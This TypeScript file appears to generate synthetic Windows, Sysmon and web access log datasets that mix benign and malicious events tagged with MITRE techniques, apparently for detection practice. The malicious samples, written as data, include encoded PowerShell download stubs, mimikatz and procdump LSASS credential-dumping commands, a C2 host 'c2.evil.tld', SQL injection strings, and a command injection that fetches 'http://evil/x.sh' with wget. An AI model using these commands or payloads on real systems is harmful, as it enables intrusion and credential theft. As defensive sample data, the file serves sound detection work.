import type { LogDataset, SecEvent, EventCategory } from './types';

// Synthetic but realistic security log datasets.
// Each dataset contains a mix of benign and malicious events with realistic field shapes.

function ev(
  source: string,
  category: EventCategory,
  malicious: boolean,
  mitre: string | undefined,
  fields: Record<string, string | number | boolean>,
  idx: number,
): SecEvent {
  return {
    id: `${source.replace(/\s/g, '-')}-${category}-${idx}`,
    source,
    category,
    timestamp: `2025-07-${String(20 + (idx % 10)).padStart(2, '0')}T${String(8 + (idx % 12)).padStart(2, '0')}:${String((idx * 7) % 60).padStart(2, '0')}:${String((idx * 13) % 60).padStart(2, '0')}Z`,
    malicious,
    mitre,
    fields,
  };
}

// ===== Windows Security: Process Creation (Event 4688) =====
const windowsProcess: SecEvent[] = [
  // Benign
  ev('Windows Security', 'process_creation', false, undefined, { EventID: 4688, Image: 'C:\\Windows\\System32\\cmd.exe', CommandLine: 'cmd.exe /c dir', User: 'CORP\\jdoe', ParentImage: 'explorer.exe' }, 1),
  ev('Windows Security', 'process_creation', false, undefined, { EventID: 4688, Image: 'C:\\Program Files\\Google\\Chrome\\chrome.exe', CommandLine: '"C:\\Program Files\\Google\\Chrome\\chrome.exe"', User: 'CORP\\asmith', ParentImage: 'explorer.exe' }, 2),
  ev('Windows Security', 'process_creation', false, undefined, { EventID: 4688, Image: 'C:\\Windows\\System32\\notepad.exe', CommandLine: 'notepad.exe C:\\notes.txt', User: 'CORP\\jdoe', ParentImage: 'explorer.exe' }, 3),
  ev('Windows Security', 'process_creation', false, undefined, { EventID: 4688, Image: 'C:\\Windows\\System32\\powershell.exe', CommandLine: 'powershell.exe -Command Get-Process', User: 'CORP\\admin', ParentImage: 'explorer.exe' }, 4),
  // Malicious: Encoded PowerShell (T1059.001)
  ev('Windows Security', 'process_creation', true, 'T1059.001', { EventID: 4688, Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAC4AcwB0AHIAaQBuAGcA', User: 'CORP\\user1', ParentImage: 'winword.exe' }, 5),
  ev('Windows Security', 'process_creation', true, 'T1059.001', { EventID: 4688, Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA', User: 'CORP\\user2', ParentImage: 'excel.exe' }, 6),
  ev('Windows Security', 'process_creation', true, 'T1059.001', { EventID: 4688, Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'powershell.exe -ExecutionPolicy Bypass -EncodedCommand aQBlAHgA', User: 'CORP\\svc', ParentImage: 'mshta.exe' }, 7),
];

// ===== Windows Security: Authentication (Event 4624/4625) =====
const windowsAuth: SecEvent[] = [
  ev('Windows Security', 'authentication', false, undefined, { EventID: 4624, LogonType: 3, TargetUserName: 'CORP\\svc_sql', IpAddress: '10.0.12.45', AuthenticationPackageName: 'Kerberos', Status: 'Success' }, 1),
  ev('Windows Security', 'authentication', false, undefined, { EventID: 4624, LogonType: 2, TargetUserName: 'CORP\\jdoe', IpAddress: '127.0.0.1', AuthenticationPackageName: 'Negotiate', Status: 'Success' }, 2),
  ev('Windows Security', 'authentication', false, undefined, { EventID: 4625, LogonType: 3, TargetUserName: 'CORP\\admin', IpAddress: '10.0.5.10', AuthenticationPackageName: 'NTLM', Status: 'Failure', FailureReason: '0xC000006D' }, 3),
  // Malicious: Pass the Hash (T1550.002)
  ev('Windows Security', 'authentication', true, 'T1550.002', { EventID: 4624, LogonType: 3, TargetUserName: 'CORP\\Administrator', IpAddress: '192.168.1.200', AuthenticationPackageName: 'NTLM', LogonProcessName: 'NtLmSsp ', Status: 'Success', SubjectUserSid: 'S-1-5-21-...' }, 4),
  ev('Windows Security', 'authentication', true, 'T1550.002', { EventID: 4624, LogonType: 3, TargetUserName: 'CORP\\DomainAdmin', IpAddress: '172.16.0.50', AuthenticationPackageName: 'NTLM', Status: 'Success' }, 5),
  ev('Windows Security', 'authentication', true, 'T1550.002', { EventID: 4625, LogonType: 3, TargetUserName: 'CORP\\svc_backup', IpAddress: '10.4.2.9', AuthenticationPackageName: 'NTLM', Status: 'Failure' }, 6),
];

// ===== Windows Security: Scheduled Task (Event 4698) =====
const windowsTask: SecEvent[] = [
  ev('Windows Security', 'scheduled_task', false, undefined, { EventID: 4698, TaskName: '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag', Creator: 'SYSTEM', TaskAction: 'defrag.exe', User: 'SYSTEM' }, 1),
  ev('Windows Security', 'scheduled_task', false, undefined, { EventID: 4698, TaskName: '\\Microsoft\\Windows\\Update\\Scheduled', Creator: 'SYSTEM', TaskAction: 'UsoClient.exe', User: 'SYSTEM' }, 2),
  // Malicious: Scheduled Task (T1053.005)
  ev('Windows Security', 'scheduled_task', true, 'T1053.005', { EventID: 4698, TaskName: '\\UpdateCheck', Creator: 'CORP\\user1', TaskAction: 'powershell.exe -EncodedCommand SQBFAFgA', User: 'CORP\\user1' }, 3),
  ev('Windows Security', 'scheduled_task', true, 'T1053.005', { EventID: 4698, TaskName: '\\SysHelper', Creator: 'CORP\\svc', TaskAction: 'C:\\Temp\\beacon.exe', User: 'CORP\\svc' }, 4),
  ev('Windows Security', 'scheduled_task', true, 'T1053.005', { EventID: 4698, TaskName: '\\OneDriveSyncx', Creator: 'CORP\\admin', TaskAction: 'cmd.exe /c C:\\Users\\Public\\download.bat', User: 'CORP\\admin' }, 5),
];

// ===== Windows Security: Service Install (Event 7045) =====
const windowsService: SecEvent[] = [
  ev('Windows Security', 'service_install', false, undefined, { EventID: 7045, ServiceName: 'Spooler', ServiceType: 'Kernel Driver', ServiceFile: '%SystemRoot%\\System32\\spoolsv.exe', StartType: 'AutoStart' }, 1),
  // Malicious: Suspicious service
  ev('Windows Security', 'service_install', true, 'T1547', { EventID: 7045, ServiceName: 'WinUpdateSvc', ServiceType: 'User Mode Service', ServiceFile: 'C:\\Users\\Public\\svc.exe', StartType: 'AutoStart' }, 2),
  ev('Windows Security', 'service_install', true, 'T1547', { EventID: 7045, ServiceName: 'SysMonitor', ServiceType: 'User Mode Service', ServiceFile: 'C:\\Temp\\payload.exe', StartType: 'AutoStart' }, 3),
];

// ===== Sysmon: Process Creation =====
const sysmonProcess: SecEvent[] = [
  ev('Sysmon', 'process_creation', false, undefined, { EventID: 1, Image: 'C:\\Windows\\System32\\svchost.exe', CommandLine: 'svchost.exe -k netsvcs', ParentImage: 'services.exe', CurrentDirectory: 'C:\\Windows\\System32\\' }, 1),
  ev('Sysmon', 'process_creation', false, undefined, { EventID: 1, Image: 'C:\\Windows\\explorer.exe', CommandLine: 'explorer.exe', ParentImage: 'userinit.exe' }, 2),
  // Malicious: Encoded PowerShell from Office (T1059.001)
  ev('Sysmon', 'process_creation', true, 'T1059.001', { EventID: 1, Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', CommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgA', ParentImage: 'C:\\Program Files\\Microsoft Office\\winword.exe', CurrentDirectory: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\' }, 3),
  // Malicious: LSASS access (T1003.001)
  ev('Sysmon', 'process_creation', true, 'T1003.001', { EventID: 1, Image: 'C:\\Temp\\mimikatz.exe', CommandLine: 'mimikatz.exe "sekurlsa::logonpasswords"', ParentImage: 'cmd.exe' }, 4),
  ev('Sysmon', 'process_creation', true, 'T1003.001', { EventID: 1, Image: 'C:\\Users\\Public\\procdump.exe', CommandLine: 'procdump.exe -accepteula -ma lsass.exe lsass.dmp', ParentImage: 'powershell.exe' }, 5),
];

// ===== Sysmon: Network Connection =====
const sysmonNetwork: SecEvent[] = [
  ev('Sysmon', 'network_connection', false, undefined, { EventID: 3, Image: 'C:\\Program Files\\Google\\Chrome\\chrome.exe', DestinationIp: '142.250.80.46', DestinationPort: 443, Protocol: 'tcp', DestinationHostname: 'google.com' }, 1),
  ev('Sysmon', 'network_connection', false, undefined, { EventID: 3, Image: 'C:\\Windows\\System32\\svchost.exe', DestinationIp: '23.211.7.12', DestinationPort: 53, Protocol: 'udp' }, 2),
  // Malicious: C2 beacon
  ev('Sysmon', 'network_connection', true, 'T1078', { EventID: 3, Image: 'C:\\Temp\\beacon.exe', DestinationIp: '185.220.101.45', DestinationPort: 8443, Protocol: 'tcp', DestinationHostname: 'c2.evil.tld' }, 3),
  ev('Sysmon', 'network_connection', true, 'T1047', { EventID: 3, Image: 'C:\\Windows\\System32\\wmic.exe', DestinationIp: '10.0.20.30', DestinationPort: 135, Protocol: 'tcp', User: 'CORP\\svc' }, 4),
];

// ===== Sysmon: File Creation =====
const sysmonFile: SecEvent[] = [
  ev('Sysmon', 'file_change', false, undefined, { EventID: 11, Image: 'C:\\Program Files\\Notepad++\\notepad++.exe', TargetFilename: 'C:\\Users\\jdoe\\Documents\\report.docx' }, 1),
  // Malicious: dropped payload
  ev('Sysmon', 'file_change', true, 'T1547', { EventID: 11, Image: 'C:\\Windows\\System32\\powershell.exe', TargetFilename: 'C:\\Users\\Public\\msupdate.exe' }, 2),
  ev('Sysmon', 'file_change', true, 'T1059.001', { EventID: 11, Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', TargetFilename: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\ps.ps1' }, 3),
];

// ===== Web Access Logs =====
const webAccess: SecEvent[] = [
  ev('Web Access', 'web_access', false, undefined, { EventID: 200, Method: 'GET', URL: '/index.html', UserAgent: 'Mozilla/5.0', StatusCode: 200, ClientIP: '203.0.113.10' }, 1),
  ev('Web Access', 'web_access', false, undefined, { EventID: 200, Method: 'GET', URL: '/api/products?id=42', UserAgent: 'Mozilla/5.0', StatusCode: 200, ClientIP: '203.0.113.12' }, 2),
  // Malicious: SQL Injection (T1190)
  ev('Web Access', 'web_access', true, 'T1190', { EventID: 200, Method: 'GET', URL: "/login.php?id=1' OR '1'='1", UserAgent: 'sqlmap/1.7', StatusCode: 500, ClientIP: '45.155.205.233' }, 3),
  ev('Web Access', 'web_access', true, 'T1190', { EventID: 200, Method: 'GET', URL: '/search?q=;cat%20/etc/passwd', UserAgent: 'curl/7.81', StatusCode: 200, ClientIP: '45.155.205.233' }, 4),
  ev('Web Access', 'web_access', true, 'T1190', { EventID: 200, Method: 'POST', URL: '/api/user', Body: '{"name":"admin\'--"}', UserAgent: 'Mozilla/5.0', StatusCode: 200, ClientIP: '198.51.100.7' }, 5),
  // Malicious: Command injection
  ev('Web Access', 'web_access', true, 'T1190', { EventID: 200, Method: 'GET', URL: '/ping?host=127.0.0.1;wget%20http://evil/x.sh', UserAgent: 'Mozilla/5.0', StatusCode: 200, ClientIP: '198.51.100.7' }, 6),
];

function buildDataset(
  id: string,
  name: string,
  description: string,
  source: LogDataset['source'],
  category: EventCategory,
  events: SecEvent[],
): LogDataset {
  const malicious = events.filter((e) => e.malicious).length;
  return {
    id,
    name,
    description,
    source,
    category,
    eventCount: events.length,
    maliciousCount: malicious,
    benignCount: events.length - malicious,
    events,
  };
}

export const DATASETS: LogDataset[] = [
  buildDataset('win-4688', 'Windows Process Creation (EID 4688)', 'Process execution events from Windows Security audit logs — includes encoded PowerShell abuse.', 'Windows Security', 'process_creation', windowsProcess),
  buildDataset('win-4624', 'Windows Authentication (EID 4624/4625)', 'Logon success and failure events — includes Pass-the-Hash patterns.', 'Windows Security', 'authentication', windowsAuth),
  buildDataset('win-4698', 'Windows Scheduled Task (EID 4698)', 'Scheduled task creation events — detects persistence via schtasks.', 'Windows Security', 'scheduled_task', windowsTask),
  buildDataset('win-7045', 'Windows Service Install (EID 7045)', 'Service installation events — detects malicious service-based persistence.', 'Windows Security', 'service_install', windowsService),
  buildDataset('sysmon-proc', 'Sysmon Process Creation (EID 1)', 'Sysmon EID 1 process creation — encoded PowerShell and LSASS credential access.', 'Sysmon', 'process_creation', sysmonProcess),
  buildDataset('sysmon-net', 'Sysmon Network Connection (EID 3)', 'Sysmon network connections — C2 beaconing and lateral WMI.', 'Sysmon', 'network_connection', sysmonNetwork),
  buildDataset('sysmon-file', 'Sysmon File Creation (EID 11)', 'Sysmon file creation events — dropped payloads and scripts.', 'Sysmon', 'file_change', sysmonFile),
  buildDataset('web-access', 'Web Access Logs', 'HTTP access logs — SQL injection, command injection, suspicious requests.', 'Web Access', 'web_access', webAccess),
];

export function getDataset(id: string): LogDataset | undefined {
  return DATASETS.find((d) => d.id === id);
}
